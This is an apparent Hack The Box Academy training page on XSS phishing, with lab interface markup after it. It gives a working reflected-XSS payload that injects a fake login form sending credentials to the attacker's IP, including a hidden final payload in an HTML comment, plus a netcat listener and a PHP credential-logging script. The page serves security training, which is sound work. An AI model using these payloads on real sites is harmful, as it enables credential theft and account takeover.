
<h1>Phishing</h1>
<hr/>
<p>Another very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.</p>
<p>Furthermore, suppose we were to identify an XSS vulnerability in a web application for a particular organization. In that case, we can use such an attack as a phishing simulation exercise, which will also help us evaluate the security awareness of the organization's employees, especially if they trust the vulnerable web application and do not expect it to harm them.</p>
<hr/>
<h2>XSS Discovery</h2>
<p>We start by attempting to find the XSS vulnerability in the web application at <code>/phishing</code> from the server at the end of this section. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it'll display it:</p>
<img class="website-screenshot" data-url="http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg" src="/storage/modules/103/xss_phishing_image_viewer.jpg"/>
<p>This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the <code>dead image url</code> icon:</p>
<img class="website-screenshot" data-url="http://SERVER_IP/phishing/index.php?url=&lt;script&gt;alert(window.origin)&lt;/script&gt;" src="/storage/modules/103/xss_phishing_alert.jpg"/>
<p>So, we must run the XSS Discovery process we previously learned to find a working XSS payload. <code>Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page</code>.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0">Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.</p>
</div>
</div>
<!-- '><script>alert(window.origin)</script> -->
<hr/>
<h2>Login Form Injection</h2>
<p>Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.</p>
<p>We can easily find an HTML code for a basic login form, or we can write our own login form. The following example should present a login form:</p>
<pre><code class="language-html">&lt;h3&gt;Please login to continue&lt;/h3&gt;
&lt;form action=http://OUR_IP&gt;
    &lt;input type="username" name="username" placeholder="Username"&gt;
    &lt;input type="password" name="password" placeholder="Password"&gt;
    &lt;input type="submit" name="submit" value="Login"&gt;
&lt;/form&gt;
</code></pre>
<p>In the above HTML code, <code>OUR_IP</code> is the IP of our VM, which we can find with the (<code>ip a</code>) command under <code>tun0</code>. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:</p>
<pre><code class="language-html">&lt;div&gt;
&lt;h3&gt;Please login to continue&lt;/h3&gt;
&lt;input type="text" placeholder="Username"&gt;
&lt;input type="text" placeholder="Password"&gt;
&lt;input type="submit" value="Login"&gt;
&lt;br&gt;&lt;br&gt;
&lt;/div&gt;
</code></pre>
<p>Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function <code>document.write()</code>, and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the <code>write</code> function, the final JavaScript code should be as follows:</p>
<pre><code class="language-javascript">document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;');
</code></pre>
<p>We can now inject this JavaScript code using our XSS payload (i.e., instead of running the <code>alert(window.origin)</code> JavaScript Code). In this case, we are exploiting a <code>Reflected XSS</code> vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the <code>Reflected XSS</code> section, and the page should look as follows when we visit the malicious URL:</p>
<img class="website-screenshot" data-url="http://SERVER_IP/phishing/index.php?url=...SNIP..." src="/storage/modules/103/xss_phishing_injected_login_form.jpg"/>
<hr/>
<h2>Cleaning Up</h2>
<p>We can see that the URL field is still displayed, which defeats our line of "<code>Please login to continue</code>". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function <code>document.getElementById().remove()</code> function.</p>
<p>To find the <code>id</code> of the HTML element we want to remove, we can open the <code>Page Inspector Picker</code> by clicking [<code>CTRL+SHIFT+C</code>] and then clicking on the element we need:
<img alt="Page Inspector Picker" src="https://academy.hackthebox.com/storage/modules/103/xss_page_inspector_picker.jpg"/></p>
<p>As we see in both the source code and the hover text, the <code>url</code> form has the id <code>urlform</code>:</p>
<pre><code class="language-html">&lt;form role="form" action="index.php" method="GET" id='urlform'&gt;
    &lt;input type="text" placeholder="Image URL" name="url"&gt;
&lt;/form&gt;
</code></pre>
<p>So, we can now use this id with the <code>remove()</code> function to remove the URL form:</p>
<pre><code class="language-javascript">document.getElementById('urlform').remove();
</code></pre>
<p>Now, once we add this code to our previous JavaScript code (after the <code>document.write</code> function), we can use this new JavaScript code in our payload:</p>
<pre><code class="language-javascript">document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;');document.getElementById('urlform').remove();
</code></pre>
<p>When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed:</p>
<img class="website-screenshot" data-url="http://SERVER_IP/phishing/index.php?url=...SNIP..." src="/storage/modules/103/xss_phishing_injected_login_form_2.jpg"/>
<p>We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:</p>
<pre><code class="language-html">...PAYLOAD... &lt;!-- 
</code></pre>
<p>As we can see, this removes the remaining bit of original HTML code, and our payload should be ready. The page now looks like it legitimately requires a login:</p>
<img class="website-screenshot" data-url="http://SERVER_IP/phishing/index.php?url=...SNIP..." src="/storage/modules/103/xss_phishing_injected_login_form_3.jpg"/>
<p>We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form. You can try visiting the URL to ensure that it will display the login form as intended. Also try logging into the above login form and see what happens.</p>
<!--
Final payload:

'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.2><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
-->
<hr/>
<h2>Credential Stealing</h2>
<p>Finally, we come to the part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the error <code>This site can’t be reached</code>. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a <code>site can’t be reached</code> error.</p>
<p>So, let us start a simple <code>netcat</code> server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo nc -lvnp 80
listening on [any] 80 ...
</code></pre>
<p>Now, let's attempt to login with the credentials <code>test:test</code>, and check the <code>netcat</code> output we get (<code>don't forget to replace OUR_IP in the XSS payload with your actual IP</code>):</p>
<pre><code class="language-shell-session">connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&amp;password=test&amp;submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
</code></pre>
<p>As we can see, we can capture the credentials in the HTTP request URL (<code>/?username=test&amp;password=test</code>). If any victim attempts to log in with the form, we will get their credentials.</p>
<p>However, as we are only listening with a <code>netcat</code> listener, it will not handle the HTTP request correctly, and the victim would get an <code>Unable to connect</code> error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.</p>
<p>The following PHP script should do what we need, and we will write it to a file on our VM that we'll call <code>index.php</code> and place it in <code>/tmp/tmpserver/</code> (<code>don't forget to replace SERVER_IP with the ip from our exercise</code>):</p>
<pre><code class="language-php">&lt;?php
if (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?&gt;
</code></pre>
<p>Now that we have our <code>index.php</code> file ready, we can start a <code>PHP</code> listening server, which we can use instead of the basic <code>netcat</code> listener we used earlier:</p>
<pre><code class="language-shell-session">[!bash!]$ mkdir /tmp/tmpserver
[!bash!]$ cd /tmp/tmpserver
[!bash!]$ vi index.php #at this step we wrote our index.php file
[!bash!]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
</code></pre>
<p>Let's try logging into the injected login form and see what we get. We see that we get redirected to the original Image Viewer page:</p>
<img class="website-screenshot" data-url="http://SERVER_IP/phishing/index.php" src="/storage/modules/103/xss_image_viewer.jpg"/>
<p>If we check the <code>creds.txt</code> file in our Pwnbox, we see that we did get the login credentials:</p>
<pre><code class="language-shell-session">[!bash!]$ cat creds.txt
Username: test | Password: test
</code></pre>
<p>With everything ready, we can start our PHP server and send the URL that includes our XSS payload to our victim, and once they log into the form, we will get their credentials and use them to access their accounts.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="36" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="39" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="41" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<label class="module-question" for="646"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer646" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-646">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="646" id="btnAnswer646">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint646" data-toggle="modal" id="hintBtn646"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
